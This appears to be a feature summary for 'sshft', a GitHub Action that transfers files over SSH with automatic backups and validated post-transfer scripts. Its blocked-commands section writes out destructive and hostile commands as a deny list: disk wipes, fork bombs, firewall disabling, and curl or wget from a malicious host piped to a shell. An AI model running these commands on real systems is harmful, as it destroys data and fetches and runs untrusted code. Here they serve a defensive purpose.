# sshft - Feature Summary

> 📖 **For complete documentation, see [README.md](README.md)** | **Quick reference: [QUICK_REFERENCE.md](QUICK_REFERENCE.md)**

Fast feature overview for the sshft GitHub Action - secure SSH file transfer with automatic backups and comprehensive security.

---

## ⚡ Core Features

### Bidirectional Transfer
- ✅ **Upload**: Runner → Remote (with automatic backup)
- ✅ **Download**: Remote → Runner (ephemeral storage)
- ✅ **Download**: Remote → Remote (server-to-server)

### Smart File Handling
- ✅ **Auto-compression**: tar.gz for efficient transfer
- ✅ **Smart detection**: Skips re-compression of compressed files
- ✅ **Auto-create paths**: Creates missing directories
- ✅ **Recursive transfers**: Handles directory trees

### Automatic Backup System
- ✅ **Before every upload**: Creates compressed backup (unless disabled)
- ✅ **Timestamped**: `backup_name_YYYYMMDD_HHMMSS_randomid.tar.gz`
- ✅ **Retention policy**: Keeps last 10 backups automatically
- ✅ **Remote storage**: `~/backups/` on remote server
- ✅ **Graceful skip**: No backup needed for first-time deployments

### Post-Transfer Scripts
- ✅ **Inline scripts**: Provide script directly in workflow
- ✅ **Remote scripts**: Execute existing scripts on server
- ✅ **Pre-validated**: Syntax and structure checks before execution
- ✅ **Non-blocking**: Script errors don't fail the action

---

## 🔒 Security Features

### File Transfer Security
| Protection | Details |
|-----------|---------|
| **Size Limits** | 2GB for uploads, 10GB for downloads |
| **Disk Space Check** | Validates 20% buffer before transfer |
| **Path Validation** | Normalizes paths, prevents traversal attacks |
| **Symlink Safety** | Detects and validates symlink targets |
| **Permission Checks** | Verifies read/write access before operations |

### Script Execution Security
| Protection | Details |
|-----------|---------|
| **Syntax Validation** | `bash -n` check before execution |
| **Structure Check** | Validates balanced braces, brackets, parentheses |
| **Dangerous Commands** | Blocks destructive operations ([see list](#-blocked-commands)) |
| **Resource Limits** | CPU (5min), memory (2GB), processes (100) |
| **Execution Timeout** | 10-minute maximum per script |
| **No Privilege Escalation** | Blocks sudo/su commands |

### SSH Security
- ✅ SSH key format validation
- ✅ Secure temporary file handling (600 permissions)
- ✅ Optional strict host key checking
- ✅ Passphrase support for encrypted keys
- ✅ Secure cleanup (keys overwritten with zeros)

---

## 🚫 Blocked Commands

Scripts cannot execute these dangerous operations:

### System Destruction
```bash
rm -rf /          # Root filesystem deletion
rm -rf ~          # Home directory deletion
rm -rf /*         # All root directories
rm -rf *          # All files in current directory
```

### Disk Operations
```bash
dd if=/dev/zero of=/dev/sda    # Disk overwrite
mkfs.*                         # Format filesystem
fdisk                          # Partition modification
parted                         # Partition modification
wipefs                         # Wipe filesystem signatures
```

### System Control
```bash
shutdown          # System shutdown
reboot            # System reboot
halt              # System halt
poweroff          # Power off system
init 0            # Runlevel change to halt
init 6            # Runlevel change to reboot
```

### Privilege Escalation
```bash
sudo              # Execute as superuser
su                # Switch user
```

### Remote Code Execution
```bash
curl https://malicious.com/script.sh | bash
wget -O- https://malicious.com/script.sh | sh
curl ... | sh     # Any curl piped to shell
wget ... | bash   # Any wget piped to shell
```

### Fork Bombs & Resource Exhaustion
```bash
:(){ :|:& };:     # Classic fork bomb
.() { .|.& };.    # Fork bomb variant
```

### Security Bypass
```bash
iptables -F       # Flush firewall rules
ufw disable       # Disable firewall
setenforce 0      # Disable SELinux
```

---

## 📊 Inputs & Outputs

### Required Inputs
| Input | Description |
|-------|-------------|
| `host` | SSH host to connect to |
| `username` | SSH username |
| `key` | SSH private key (from secrets) |
| `source` | Source file/directory path |
| `destination` | Destination path |

### Optional Inputs
| Input | Default | Description |
|-------|---------|-------------|
| `port` | `22` | SSH port |
| `direction` | `upload` | `upload` or `download` |
| `recursive` | `true` | Transfer recursively |
| `strict_host_key_checking` | `true` | Verify host keys |
| `backup_before_transfer` | `true` | Backup before upload |
| `post_script` | - | Inline script to execute |
| `post_script_path` | - | Remote script path |
| `passphrase` | - | SSH key passphrase |
| `destination_host` | - | For remote-to-remote downloads |
| `destination_port` | `22` | Destination SSH port |
| `destination_username` | - | Destination username |
| `destination_key` | - | Destination SSH key |
| `destination_passphrase` | - | Destination key passphrase |

### Outputs
| Output | Description |
|--------|-------------|
| `success` | Transfer completed successfully |
| `backup_created` | Whether backup was created |
| `backup_path` | Path to backup on remote server |
| `backup_size` | Human-readable backup size |
| `error` | Error message if failed |
| `script_executed` | Whether post-script ran |
| `script_output` | Script stdout/stderr |
| `script_error` | Script error message |

---

## 🎯 Quick Examples

### Minimal Upload
```yaml
- uses: kellydc/sshft@v1
  with:
    host: ${{ secrets.SSH_HOST }}
    username: ${{ secrets.SSH_USER }}
    key: ${{ secrets.SSH_KEY }}
    source: "dist/"
    destination: "/var/www/html/"
```

### Download to Runner
```yaml
- uses: kellydc/sshft@v1
  with:
    host: ${{ secrets.SSH_HOST }}
    username: ${{ secrets.SSH_USER }}
    key: ${{ secrets.SSH_KEY }}
    source: "/var/log/app.log"
    destination: "./logs/"
    direction: "download"

# Save to persist beyond workflow
- uses: actions/upload-artifact@v4
  with:
    name: logs
    path: ./logs/
```

### Download Remote-to-Remote
```yaml
- uses: kellydc/sshft@v1
  with:
    host: ${{ secrets.SOURCE_HOST }}
    username: ${{ secrets.SOURCE_USER }}
    key: ${{ secrets.SOURCE_KEY }}
    source: "/data/files/"
    destination: "/backups/"
    direction: "download"
    destination_host: ${{ secrets.DEST_HOST }}
    destination_username: ${{ secrets.DEST_USER }}
    destination_key: ${{ secrets.DEST_KEY }}
```

### With Post-Script
```yaml
- uses: kellydc/sshft@v1
  with:
    host: ${{ secrets.SSH_HOST }}
    username: ${{ secrets.SSH_USER }}
    key: ${{ secrets.SSH_KEY }}
    source: "dist/"
    destination: "/var/www/html/"
    post_script: |
      systemctl restart nginx
      echo "Deployed at $(date)"
```

### With Rollback Capability
```yaml
- id: deploy
  uses: kellydc/sshft@v1
  with:
    host: ${{ secrets.SSH_HOST }}
    username: ${{ secrets.SSH_USER }}
    key: ${{ secrets.SSH_KEY }}
    source: "dist/"
    destination: "/var/www/html/"

- if: failure() && steps.deploy.outputs.backup_created == 'true'
  run: |
    ssh user@host "tar -xzf ${{ steps.deploy.outputs.backup_path }} -C /var/www/"
```

---

## ⚠️ Important Behaviors

### Download Modes

**Remote → Runner** (no `destination_host`): Files download to GitHub runner's ephemeral storage.
- ⚠️ **Runner storage is destroyed** after workflow completes
- **Must use `actions/upload-artifact`** to persist files

**Remote → Remote** (with `destination_host`): Files transfer directly between servers.
- ✅ Files persist on destination server
- No artifact upload needed

### Auto-Creation
Destination directories are **created automatically** if they don't exist.

### Backup Behavior

| Scenario | Backup Created? |
|----------|----------------|
| Upload (first time) | ❌ No (destination doesn't exist) |
| Upload (subsequent) | ✅ Yes (destination exists) |
| Upload with `backup_before_transfer: false` | ❌ No (disabled) |
| Download | ❌ No (download-only, no backup) |

---

## 🐛 Common Error Messages

| Error | Cause | Solution |
|-------|-------|----------|
| `Source does not exist` | Source path is invalid | Verify source path exists before transfer |
| `Source size exceeds limit` | Upload > 2GB or Download > 10GB | Split into smaller transfers |
| `Insufficient disk space` | Not enough space on target | Free up disk space or use different destination |
| `Connection failed` | SSH connection issue | Verify host, username, key, and network |
| `Invalid SSH key` | Key format is incorrect | Verify key is valid SSH private key |
| `Script validation failed` | Syntax or structure error | Fix script syntax, check braces/brackets |
| `Dangerous command detected` | Blocked command in script | Remove blocked command ([see list](#-blocked-commands)) |
| `Permission denied` | Insufficient permissions | Verify user has write access to destination |

---

## 📚 Full Documentation

| Document | Purpose |
|----------|---------|
| **[README.md](README.md)** | Complete guide and examples |
| **[QUICK_REFERENCE.md](QUICK_REFERENCE.md)** | Quick lookup and troubleshooting |
| **[EXAMPLES.md](EXAMPLES.md)** | Real-world usage patterns |
| **[SECURITY.md](SECURITY.md)** | Detailed security information |
| **[VISUAL_GUIDE.md](VISUAL_GUIDE.md)** | Workflow diagrams |
| **[ARCHITECTURE.md](ARCHITECTURE.md)** | Technical architecture |
| **[DOCS_INDEX.md](DOCS_INDEX.md)** | Documentation index |

---

## 🚀 Next Steps

1. **New users**: Read [README.md](README.md) for detailed setup
2. **Common tasks**: See [QUICK_REFERENCE.md](QUICK_REFERENCE.md)
3. **Examples**: Browse [EXAMPLES.md](EXAMPLES.md)
4. **Security review**: Read [SECURITY.md](SECURITY.md)
5. **Troubleshooting**: Check [QUICK_REFERENCE.md#troubleshooting](QUICK_REFERENCE.md#-troubleshooting)

